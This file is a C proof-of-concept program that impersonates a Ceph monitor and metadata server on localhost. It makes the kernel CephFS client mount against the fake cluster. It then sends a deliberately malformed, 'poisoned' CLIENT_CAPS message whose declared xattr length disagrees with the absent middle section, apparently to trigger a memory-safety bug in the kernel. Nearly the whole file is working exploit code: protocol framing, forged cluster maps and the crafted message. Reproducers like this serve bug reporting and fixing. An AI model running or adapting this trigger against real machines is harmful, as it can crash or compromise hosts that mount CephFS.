// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define CEPH_BANNER "ceph v027"
#define CEPH_BANNER_LEN 9

#define CEPH_MSGR_TAG_READY          1
#define CEPH_MSGR_TAG_CLOSE          6
#define CEPH_MSGR_TAG_MSG            7
#define CEPH_MSGR_TAG_ACK            8
#define CEPH_MSGR_TAG_KEEPALIVE      9
#define CEPH_MSGR_TAG_SEQ           13
#define CEPH_MSGR_TAG_KEEPALIVE2    14
#define CEPH_MSGR_TAG_KEEPALIVE2_ACK 15

#define CEPH_ENTITY_TYPE_MON    0x01
#define CEPH_ENTITY_TYPE_MDS    0x02
#define CEPH_ENTITY_TYPE_CLIENT 0x08

#define CEPH_ENTITY_ADDR_TYPE_NONE      0
#define CEPH_ENTITY_ADDR_TYPE_LEGACY    1

#define CEPH_MSG_MON_MAP                4
#define CEPH_MSG_MON_SUBSCRIBE          15
#define CEPH_MSG_MON_SUBSCRIBE_ACK      16
#define CEPH_MSG_AUTH                   17
#define CEPH_MSG_AUTH_REPLY             18
#define CEPH_MSG_MDS_MAP                21
#define CEPH_MSG_CLIENT_SESSION         22
#define CEPH_MSG_CLIENT_REQUEST         24
#define CEPH_MSG_CLIENT_REPLY           26
#define CEPH_MSG_OSD_MAP                41
#define CEPH_MSG_CLIENT_CAPS            0x310

#define CEPH_AUTH_NONE                  0x1

#define CEPH_SESSION_REQUEST_OPEN       0
#define CEPH_SESSION_OPEN               1

#define CEPH_MDS_OP_GETATTR             0x00101
#define CEPH_MDS_STATE_ACTIVE           13

#define CEPH_INO_ROOT                   1ULL
#define CEPH_NOSNAP                     ((uint64_t)-2)
#define CEPH_INLINE_NONE                ((uint64_t)-1)

#define CEPH_CAP_PIN            1
#define CEPH_CAP_AUTH_SHARED    (1u << 2)
#define CEPH_CAP_LINK_SHARED    (1u << 4)
#define CEPH_CAP_XATTR_SHARED   (1u << 6)
#define CEPH_CAP_XATTR_EXCL     (2u << 6)
#define CEPH_CAP_FILE_SHARED    (1u << 8)
#define CEPH_CAP_FLAG_AUTH      1

#define CEPH_CAP_OP_GRANT       0

#define CEPH_FEATURE_MSG_AUTH   (1ULL << 23)

#define CEPHFS_FEATURE_REPLY_ENCODING_BIT 9

#define CRUSH_MAGIC 0x00010000UL

#define MON_PORT 6789
#define MDS_PORT 6800

struct ceph_timespec { uint32_t tv_sec, tv_nsec; } __attribute__((packed));

struct ceph_entity_name { uint8_t type; uint64_t num; } __attribute__((packed));

struct ceph_msg_header {
	uint64_t seq;
	uint64_t tid;
	uint16_t type;
	uint16_t priority;
	uint16_t version;
	uint32_t front_len;
	uint32_t middle_len;
	uint32_t data_len;
	uint16_t data_off;
	struct ceph_entity_name src;
	uint16_t compat_version;
	uint16_t reserved;
	uint32_t crc;
} __attribute__((packed));

struct ceph_msg_footer_old {
	uint32_t front_crc, middle_crc, data_crc;
	uint8_t flags;
} __attribute__((packed));

struct ceph_msg_footer {
	uint32_t front_crc, middle_crc, data_crc;
	uint64_t sig;
	uint8_t flags;
} __attribute__((packed));

struct ceph_msg_connect {
	uint64_t features;
	uint32_t host_type;
	uint32_t global_seq;
	uint32_t connect_seq;
	uint32_t protocol_version;
	uint32_t authorizer_protocol;
	uint32_t authorizer_len;
	uint8_t  flags;
} __attribute__((packed));

struct ceph_msg_connect_reply {
	uint8_t  tag;
	uint64_t features;
	uint32_t global_seq;
	uint32_t connect_seq;
	uint32_t protocol_version;
	uint32_t authorizer_len;
	uint8_t  flags;
} __attribute__((packed));

struct ceph_file_layout_legacy {
	uint32_t fl_stripe_unit, fl_stripe_count, fl_object_size, fl_cas_hash;
	uint32_t fl_object_stripe_unit, fl_unused, fl_pg_pool;
} __attribute__((packed));

struct ceph_mds_reply_cap {
	uint32_t caps, wanted;
	uint64_t cap_id;
	uint32_t seq, mseq;
	uint64_t realm;
	uint8_t  flags;
} __attribute__((packed));

struct ceph_mds_reply_inode {
	uint64_t ino, snapid;
	uint32_t rdev;
	uint64_t version, xattr_version;
	struct ceph_mds_reply_cap cap;
	struct ceph_file_layout_legacy layout;
	struct ceph_timespec ctime, mtime, atime;
	uint32_t time_warp_seq;
	uint64_t size, max_size, truncate_size;
	uint32_t truncate_seq;
	uint32_t mode, uid, gid;
	uint32_t nlink;
	uint64_t files, subdirs, rbytes, rfiles, rsubdirs;
	struct ceph_timespec rctime;
	uint32_t nsplits;
} __attribute__((packed));

struct ceph_mds_reply_head {
	uint32_t op, result, mdsmap_epoch;
	uint8_t  safe, is_dentry, is_target;
} __attribute__((packed));

struct ceph_mds_caps {
	uint32_t op;
	uint64_t ino, realm;
	uint64_t cap_id;
	uint32_t seq, issue_seq;
	uint32_t caps, wanted, dirty;
	uint32_t migrate_seq;
	uint64_t snap_follows;
	uint32_t snap_trace_len;
	uint32_t uid, gid, mode;
	uint32_t nlink;
	uint32_t xattr_len;
	uint64_t xattr_version;
	uint64_t size, max_size, truncate_size;
	uint32_t truncate_seq;
	struct ceph_timespec mtime, atime, ctime;
	struct ceph_file_layout_legacy layout;
	uint32_t time_warp_seq;
} __attribute__((packed));

struct ceph_mds_session_head {
	uint32_t op;
	uint64_t seq;
	struct ceph_timespec stamp;
	uint32_t max_caps, max_leases;
} __attribute__((packed));

static uint32_t crc32c_tab[256];

static void crc32c_init(void)
{
	uint32_t i, j, c;
	for (i = 0; i < 256; i++) {
		c = i;
		for (j = 0; j < 8; j++)
			c = (c & 1) ? (0x82F63B78u ^ (c >> 1)) : (c >> 1);
		crc32c_tab[i] = c;
	}
}

static uint32_t crc32c(uint32_t crc, const void *buf, size_t len)
{
	const uint8_t *p = buf;
	while (len--)
		crc = crc32c_tab[(crc ^ *p++) & 0xff] ^ (crc >> 8);
	return crc;
}

struct buf {
	uint8_t d[16384];
	size_t n;
};

static void b_reset(struct buf *b) { b->n = 0; }
static void b_raw(struct buf *b, const void *p, size_t n)
{
	memcpy(b->d + b->n, p, n);
	b->n += n;
}
static void b_u8(struct buf *b, uint8_t v)   { b_raw(b, &v, 1); }
static void b_u16(struct buf *b, uint16_t v) { b_raw(b, &v, 2); }
static void b_u32(struct buf *b, uint32_t v) { b_raw(b, &v, 4); }
static void b_u64(struct buf *b, uint64_t v) { b_raw(b, &v, 8); }
static void b_zero(struct buf *b, size_t n)  { memset(b->d + b->n, 0, n); b->n += n; }

static int xread(int fd, void *buf, size_t n)
{
	uint8_t *p = buf;
	while (n) {
		ssize_t r = read(fd, p, n);
		if (r <= 0) {
			if (r < 0 && errno == EINTR)
				continue;
			return -1;
		}
		p += r;
		n -= r;
	}
	return 0;
}

static int xwrite(int fd, const void *buf, size_t n)
{
	const uint8_t *p = buf;
	while (n) {
		ssize_t r = write(fd, p, n);
		if (r <= 0) {
			if (r < 0 && errno == EINTR)
				continue;
			return -1;
		}
		p += r;
		n -= r;
	}
	return 0;
}

static int xskip(int fd, size_t n)
{
	uint8_t tmp[1024];
	while (n) {
		size_t c = n > sizeof(tmp) ? sizeof(tmp) : n;
		if (xread(fd, tmp, c))
			return -1;
		n -= c;
	}
	return 0;
}

struct conn {
	int fd;
	uint64_t out_seq;
	uint64_t in_seq;
	uint8_t  peer_type;
	uint64_t peer_num;
};

static int send_msg(struct conn *c, uint16_t type, uint16_t version,
		    uint64_t tid, const void *front, uint32_t front_len,
		    uint32_t middle_len)
{
	struct ceph_msg_header h;
	struct ceph_msg_footer f;
	uint8_t tag = CEPH_MSGR_TAG_MSG;

	memset(&h, 0, sizeof(h));
	h.seq = ++c->out_seq;
	h.tid = tid;
	h.type = type;
	h.priority = 127;
	h.version = version;
	h.front_len = front_len;
	h.middle_len = middle_len;
	h.data_len = 0;
	h.data_off = 0;
	h.src.type = c->peer_type;
	h.src.num = c->peer_num;
	h.compat_version = 1;
	h.reserved = 0;
	h.crc = crc32c(0, &h, offsetof(struct ceph_msg_header, crc));

	memset(&f, 0, sizeof(f));
	f.front_crc = crc32c(0, front, front_len);
	f.middle_crc = 0;
	f.data_crc = 0;
	f.sig = 0;
	f.flags = 1;

	if (xwrite(c->fd, &tag, 1))
		return -1;
	if (xwrite(c->fd, &h, sizeof(h)))
		return -1;
	if (front_len && xwrite(c->fd, front, front_len))
		return -1;
	if (xwrite(c->fd, &f, sizeof(f)))
		return -1;
	return 0;
}

static int send_ack(struct conn *c, uint64_t seq)
{
	uint8_t tag = CEPH_MSGR_TAG_ACK;
	if (xwrite(c->fd, &tag, 1))
		return -1;
	return xwrite(c->fd, &seq, 8);
}

static void put_banner_addr(struct buf *b, uint32_t nonce, int blank,
			    uint16_t port)
{
	uint8_t ss[128];

	memset(ss, 0, sizeof(ss));
	if (!blank) {
		ss[0] = 0x00;
		ss[1] = 0x02;
		ss[2] = (port >> 8) & 0xff;
		ss[3] = port & 0xff;
		ss[4] = 127; ss[5] = 0; ss[6] = 0; ss[7] = 1;
	}
	b_u32(b, CEPH_ENTITY_ADDR_TYPE_NONE);
	b_u32(b, nonce);
	b_raw(b, ss, sizeof(ss));
}

static void put_entity_addr(struct buf *b, uint16_t port)
{
	uint8_t sin[16];

	memset(sin, 0, sizeof(sin));
	sin[0] = 2; sin[1] = 0;
	sin[2] = (port >> 8) & 0xff;
	sin[3] = port & 0xff;
	sin[4] = 127; sin[5] = 0; sin[6] = 0; sin[7] = 1;

	b_u8(b, 1);
	b_u8(b, 1);
	b_u8(b, 1);
	b_u32(b, 4 + 4 + 4 + sizeof(sin));
	b_u32(b, CEPH_ENTITY_ADDR_TYPE_LEGACY);
	b_u32(b, 0);
	b_u32(b, sizeof(sin));
	b_raw(b, sin, sizeof(sin));
}

static int do_handshake(struct conn *c, uint16_t my_port)
{
	uint8_t banner[CEPH_BANNER_LEN];
	uint8_t cli_addr[136];
	struct buf b;
	struct ceph_msg_connect cn;
	struct ceph_msg_connect_reply rep;

	if (xread(c->fd, banner, CEPH_BANNER_LEN))
		return -1;
	if (memcmp(banner, CEPH_BANNER, CEPH_BANNER_LEN)) {
		fprintf(stderr, "[srv:%u] bad banner\n", my_port);
		return -1;
	}
	if (xread(c->fd, cli_addr, sizeof(cli_addr)))
		return -1;

	b_reset(&b);
	b_raw(&b, CEPH_BANNER, CEPH_BANNER_LEN);
	put_banner_addr(&b, 0, 1, 0);
	put_banner_addr(&b, 0, 0, 0);
	if (xwrite(c->fd, b.d, b.n))
		return -1;

	if (xread(c->fd, &cn, sizeof(cn)))
		return -1;
	if (cn.authorizer_len && xskip(c->fd, cn.authorizer_len))
		return -1;

	memset(&rep, 0, sizeof(rep));
	rep.tag = CEPH_MSGR_TAG_READY;

	rep.features = cn.features;
	rep.global_seq = 1;
	rep.connect_seq = cn.connect_seq + 1;
	rep.protocol_version = cn.protocol_version;
	rep.authorizer_len = 0;
	rep.flags = 0;
	if (xwrite(c->fd, &rep, sizeof(rep)))
		return -1;

	fprintf(stderr, "[srv:%u] handshake done (feat %llx)\n", my_port,
		(unsigned long long)cn.features);
	return 0;
}

static const uint8_t FSID[16] = {
	0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,
	0x99,0xaa,0xbb,0xcc,0xdd,0xee,0xff,0x00
};

static void build_auth_reply(struct buf *b)
{
	b_reset(b);
	b_u32(b, CEPH_AUTH_NONE);
	b_u32(b, 0);
	b_u64(b, 4321);
	b_u32(b, 0);
	b_u32(b, 0);
}

static void build_subscribe_ack(struct buf *b)
{
	b_reset(b);
	b_u32(b, 3600);
	b_raw(b, FSID, 16);
}

static void build_monmap(struct buf *b)
{
	struct buf blob;

	b_reset(&blob);
	b_u8(&blob, 3);
	b_u8(&blob, 3);
	b_u32(&blob, 0);
	{
		size_t lenpos = blob.n - 4;
		b_raw(&blob, FSID, 16);
		b_u32(&blob, 1);
		b_u32(&blob, 1);
		b_u32(&blob, 0);
		put_entity_addr(&blob, MON_PORT);
		*(uint32_t *)(blob.d + lenpos) = (uint32_t)(blob.n - lenpos - 4);
	}

	b_reset(b);
	b_u32(b, (uint32_t)blob.n);
	b_raw(b, blob.d, blob.n);
}

static void build_osdmap(struct buf *b)
{
	struct buf crush, map;

	b_reset(&crush);
	b_u32(&crush, CRUSH_MAGIC);
	b_u32(&crush, 0);
	b_u32(&crush, 0);
	b_u32(&crush, 0);
	b_u32(&crush, 0);
	b_u32(&crush, 0);
	b_u32(&crush, 0);

	b_reset(&map);
	b_u16(&map, 6);
	b_raw(&map, FSID, 16);
	b_u32(&map, 1);
	b_zero(&map, 8);
	b_zero(&map, 8);
	b_u32(&map, 0);
	b_u32(&map, 0);
	b_u32(&map, 0);
	b_u32(&map, 0);
	b_u32(&map, 0);
	b_u32(&map, 0);
	b_u32(&map, 0);
	b_u32(&map, 0);
	b_u32(&map, 0);
	b_u32(&map, (uint32_t)crush.n);
	b_raw(&map, crush.d, crush.n);

	b_reset(b);
	b_raw(b, FSID, 16);
	b_u32(b, 0);
	b_u32(b, 1);
	b_u32(b, 1);
	b_u32(b, (uint32_t)map.n);
	b_raw(b, map.d, map.n);
}

static void build_mdsmap(struct buf *b)
{
	struct buf m;
	static const char fsname[] = "cephfs";

	b_reset(&m);
	b_u8(&m, 2);
	b_u8(&m, 1);
	b_u32(&m, 2);
	b_u32(&m, 2);
	b_u32(&m, 0);
	b_u32(&m, 0);
	b_u32(&m, 60);
	b_u32(&m, 300);
	b_u64(&m, 1ULL << 40);
	b_u32(&m, 1);
	b_u32(&m, 1);

	b_u64(&m, 1);
	b_u8(&m, 1);
	b_u64(&m, 0);
	b_u32(&m, 0);
	b_u32(&m, 0);
	b_u32(&m, 1);
	b_u32(&m, CEPH_MDS_STATE_ACTIVE);
	b_u64(&m, 0);
	put_entity_addr(&m, MDS_PORT);
	b_zero(&m, 8);
	b_u32(&m, 0);
	b_u32(&m, 0);

	b_u32(&m, 0);
	b_u64(&m, 0);

	b_u16(&m, 8);

	{
		int i;
		for (i = 0; i < 3; i++) {
			b_u64(&m, 0);
			b_u32(&m, 0);
		}
	}
	b_u64(&m, 1);
	b_zero(&m, 8);
	b_zero(&m, 8);
	b_u32(&m, 0);
	b_u32(&m, 1);
	b_u32(&m, 0);
	b_u32(&m, 0);
	b_u32(&m, 0);
	b_u32(&m, 0);
	b_u32(&m, 0);
	b_u32(&m, 0);
	b_u8(&m, 0);
	b_u8(&m, 0);
	b_u8(&m, 0);
	b_u8(&m, 1);
	b_u32(&m, sizeof(fsname) - 1);
	b_raw(&m, fsname, sizeof(fsname) - 1);

	b_reset(b);
	b_raw(b, FSID, 16);
	b_u32(b, 2);
	b_u32(b, (uint32_t)m.n);
	b_raw(b, m.d, m.n);
}

static void build_session_open(struct buf *b)
{
	struct ceph_mds_session_head h;

	memset(&h, 0, sizeof(h));
	h.op = CEPH_SESSION_OPEN;
	h.seq = 0;
	h.max_caps = 1024;
	h.max_leases = 1024;

	b_reset(b);
	b_raw(b, &h, sizeof(h));
	b_u32(b, 0);
	b_u32(b, 8);
	b_u64(b, 1ULL << CEPHFS_FEATURE_REPLY_ENCODING_BIT);
}

#define GRANTED_CAPS (CEPH_CAP_PIN | CEPH_CAP_AUTH_SHARED | \
		      CEPH_CAP_LINK_SHARED | CEPH_CAP_XATTR_SHARED | \
		      CEPH_CAP_FILE_SHARED)

static void build_client_reply(struct buf *b)
{
	struct ceph_mds_reply_head head;
	struct ceph_mds_reply_inode in;
	struct buf trace, snap;

	memset(&head, 0, sizeof(head));
	head.op = CEPH_MDS_OP_GETATTR;
	head.result = 0;
	head.mdsmap_epoch = 2;
	head.safe = 1;
	head.is_dentry = 0;
	head.is_target = 1;

	memset(&in, 0, sizeof(in));
	in.ino = CEPH_INO_ROOT;
	in.snapid = CEPH_NOSNAP;
	in.version = 2;
	in.xattr_version = 0;
	in.cap.caps = GRANTED_CAPS;
	in.cap.wanted = 0;
	in.cap.cap_id = 1;
	in.cap.seq = 1;
	in.cap.mseq = 0;
	in.cap.realm = 1;
	in.cap.flags = CEPH_CAP_FLAG_AUTH;
	in.layout.fl_stripe_unit = 4194304;
	in.layout.fl_stripe_count = 1;
	in.layout.fl_object_size = 4194304;
	in.layout.fl_pg_pool = 1;
	in.mode = 040755;
	in.uid = 0;
	in.gid = 0;
	in.nlink = 2;
	in.size = 0;
	in.max_size = 0;
	in.truncate_size = (uint64_t)-1;
	in.truncate_seq = 1;
	in.nsplits = 0;

	b_reset(&trace);
	b_u8(&trace, 1);
	b_u8(&trace, 1);
	b_u32(&trace, 0);
	{
		size_t lenpos = trace.n - 4;
		b_raw(&trace, &in, sizeof(in));
		b_u32(&trace, 0);
		b_zero(&trace, 8);
		b_u32(&trace, 0);
		b_u64(&trace, CEPH_INLINE_NONE);
		b_u32(&trace, 0);

		b_u8(&trace, 1);
		b_u8(&trace, 1);
		b_u32(&trace, 16);
		b_u64(&trace, 0);
		b_u64(&trace, 0);
		b_u32(&trace, 0);
		b_zero(&trace, 8);
		b_u64(&trace, 0);
		*(uint32_t *)(trace.d + lenpos) = (uint32_t)(trace.n - lenpos - 4);
	}

	b_reset(&snap);
	b_u64(&snap, 1);
	b_u64(&snap, 0);
	b_u64(&snap, 0);
	b_u64(&snap, 0);
	b_u64(&snap, 1);
	b_u32(&snap, 0);
	b_u32(&snap, 0);

	b_reset(b);
	b_raw(b, &head, sizeof(head));
	b_u32(b, (uint32_t)trace.n);
	b_raw(b, trace.d, trace.n);
	b_u32(b, 0);
	b_u32(b, (uint32_t)snap.n);
	b_raw(b, snap.d, snap.n);
}

static void build_evil_caps(struct buf *b)
{
	struct ceph_mds_caps h;

	memset(&h, 0, sizeof(h));
	h.op = CEPH_CAP_OP_GRANT;
	h.ino = CEPH_INO_ROOT;
	h.realm = 1;
	h.cap_id = 1;
	h.seq = 2;
	h.issue_seq = 1;
	h.caps = GRANTED_CAPS;
	h.wanted = 0;
	h.dirty = 0;
	h.migrate_seq = 0;
	h.snap_follows = 0;
	h.snap_trace_len = 0;
	h.uid = 0;
	h.gid = 0;
	h.mode = 040755;
	h.nlink = 2;

	h.xattr_len = 1;
	h.xattr_version = 1;

	h.size = 0;
	h.max_size = 0;
	h.truncate_size = (uint64_t)-1;
	h.truncate_seq = 1;
	h.layout.fl_stripe_unit = 4194304;
	h.layout.fl_stripe_count = 1;
	h.layout.fl_object_size = 4194304;
	h.layout.fl_pg_pool = 1;
	h.time_warp_seq = 0;

	b_reset(b);
	b_raw(b, &h, sizeof(h));
}

struct in_msg {
	struct ceph_msg_header hdr;
	uint8_t front[8192];
};

static int read_one(struct conn *c, struct in_msg *m)
{
	uint8_t tag;
	uint8_t tmp[64];

	if (xread(c->fd, &tag, 1))
		return -1;

	switch (tag) {
	case CEPH_MSGR_TAG_MSG: {
		uint32_t fl, ml, dl;

		if (xread(c->fd, &m->hdr, sizeof(m->hdr)))
			return -1;
		fl = m->hdr.front_len;
		ml = m->hdr.middle_len;
		dl = m->hdr.data_len;
		if (fl > sizeof(m->front))
			return -1;
		if (fl && xread(c->fd, m->front, fl))
			return -1;
		if (ml && xskip(c->fd, ml))
			return -1;
		if (dl && xskip(c->fd, dl))
			return -1;
		if (xread(c->fd, tmp, sizeof(struct ceph_msg_footer)))
			return -1;
		c->in_seq = m->hdr.seq;
		send_ack(c, c->in_seq);
		return 1;
	}
	case CEPH_MSGR_TAG_ACK:
	case CEPH_MSGR_TAG_SEQ:
		return xread(c->fd, tmp, 8) ? -1 : 0;
	case CEPH_MSGR_TAG_KEEPALIVE:
		return 0;
	case CEPH_MSGR_TAG_KEEPALIVE2: {
		uint8_t ts[8], ack = CEPH_MSGR_TAG_KEEPALIVE2_ACK;
		if (xread(c->fd, ts, 8))
			return -1;
		if (xwrite(c->fd, &ack, 1) || xwrite(c->fd, ts, 8))
			return -1;
		return 0;
	}
	case CEPH_MSGR_TAG_KEEPALIVE2_ACK:
		return xread(c->fd, tmp, 8) ? -1 : 0;
	case CEPH_MSGR_TAG_CLOSE:
		return -1;
	default:
		fprintf(stderr, "unknown tag %u\n", tag);
		return -1;
	}
}

static int listen_on(uint16_t port)
{
	int fd, one = 1;
	struct sockaddr_in sa;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) {
		perror("socket");
		return -1;
	}
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("bind");
		close(fd);
		return -1;
	}
	if (listen(fd, 8) < 0) {
		perror("listen");
		close(fd);
		return -1;
	}
	return fd;
}

static int mon_lfd = -1, mds_lfd = -1;

static void *mon_thread(void *arg)
{
	struct buf b;
	struct in_msg m;

	(void)arg;
	for (;;) {
		struct conn c;
		int fd = accept(mon_lfd, NULL, NULL);

		if (fd < 0)
			continue;
		fprintf(stderr, "[mon] connection\n");
		memset(&c, 0, sizeof(c));
		c.fd = fd;
		c.peer_type = CEPH_ENTITY_TYPE_MON;
		c.peer_num = 0;

		if (do_handshake(&c, MON_PORT) == 0) {
			for (;;) {
				int r = read_one(&c, &m);

				if (r < 0)
					break;
				if (r == 0)
					continue;

				switch (m.hdr.type) {
				case CEPH_MSG_AUTH:
					fprintf(stderr, "[mon] AUTH\n");
					build_auth_reply(&b);
					send_msg(&c, CEPH_MSG_AUTH_REPLY, 1, 0,
						 b.d, b.n, 0);
					break;
				case CEPH_MSG_MON_SUBSCRIBE:
					fprintf(stderr, "[mon] SUBSCRIBE\n");
					build_subscribe_ack(&b);
					send_msg(&c, CEPH_MSG_MON_SUBSCRIBE_ACK,
						 1, 0, b.d, b.n, 0);
					build_monmap(&b);
					send_msg(&c, CEPH_MSG_MON_MAP, 1, 0,
						 b.d, b.n, 0);
					build_osdmap(&b);
					send_msg(&c, CEPH_MSG_OSD_MAP, 1, 0,
						 b.d, b.n, 0);
					build_mdsmap(&b);
					send_msg(&c, CEPH_MSG_MDS_MAP, 1, 0,
						 b.d, b.n, 0);
					break;
				default:
					fprintf(stderr, "[mon] msg type %u\n",
						m.hdr.type);
					break;
				}
			}
		}
		fprintf(stderr, "[mon] connection closed\n");
		close(fd);
	}
	return NULL;
}

static void *mds_thread(void *arg)
{
	struct buf b;
	struct in_msg m;

	(void)arg;
	for (;;) {
		struct conn c;
		int fd = accept(mds_lfd, NULL, NULL);

		if (fd < 0)
			continue;
		fprintf(stderr, "[mds] connection\n");
		memset(&c, 0, sizeof(c));
		c.fd = fd;
		c.peer_type = CEPH_ENTITY_TYPE_MDS;
		c.peer_num = 0;

		if (do_handshake(&c, MDS_PORT) == 0) {
			for (;;) {
				int r = read_one(&c, &m);

				if (r < 0)
					break;
				if (r == 0)
					continue;

				switch (m.hdr.type) {
				case CEPH_MSG_CLIENT_SESSION:
					fprintf(stderr, "[mds] SESSION op %u\n",
						*(uint32_t *)m.front);
					if (*(uint32_t *)m.front !=
					    CEPH_SESSION_REQUEST_OPEN)
						break;
					build_session_open(&b);
					send_msg(&c, CEPH_MSG_CLIENT_SESSION,
						 3, 0, b.d, b.n, 0);
					break;
				case CEPH_MSG_CLIENT_REQUEST:
					fprintf(stderr,
						"[mds] REQUEST tid %llu\n",
						(unsigned long long)m.hdr.tid);
					build_client_reply(&b);
					send_msg(&c, CEPH_MSG_CLIENT_REPLY, 1,
						 m.hdr.tid, b.d, b.n, 0);

					fprintf(stderr,
						"[mds] sending poisoned CLIENT_CAPS "
						"(xattr_len=1, middle_len=0)\n");
					build_evil_caps(&b);
					send_msg(&c, CEPH_MSG_CLIENT_CAPS, 1, 0,
						 b.d, b.n, 0 );
					break;
				default:
					fprintf(stderr, "[mds] msg type %u\n",
						m.hdr.type);
					break;
				}
			}
		}
		fprintf(stderr, "[mds] connection closed\n");
		close(fd);
	}
	return NULL;
}

int main(void)
{
	pthread_t t1, t2;
	int r;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	crc32c_init();

	mon_lfd = listen_on(MON_PORT);
	mds_lfd = listen_on(MDS_PORT);
	if (mon_lfd < 0 || mds_lfd < 0)
		return 1;

	pthread_create(&t1, NULL, mon_thread, NULL);
	pthread_create(&t2, NULL, mds_thread, NULL);

	if (mkdir("./cephmnt", 0755) < 0 && errno != EEXIST) {
		perror("mkdir");
		return 1;
	}

	fprintf(stderr, "[poc] mounting cephfs against fake cluster...\n");
	r = mount("127.0.0.1:6789:/", "./cephmnt", "ceph", 0,
		  "mount_timeout=30");
	fprintf(stderr, "[poc] mount returned %d (%s)\n", r,
		r ? strerror(errno) : "ok");

	sleep(10);
	fprintf(stderr, "[poc] still alive\n");
	return 0;
}
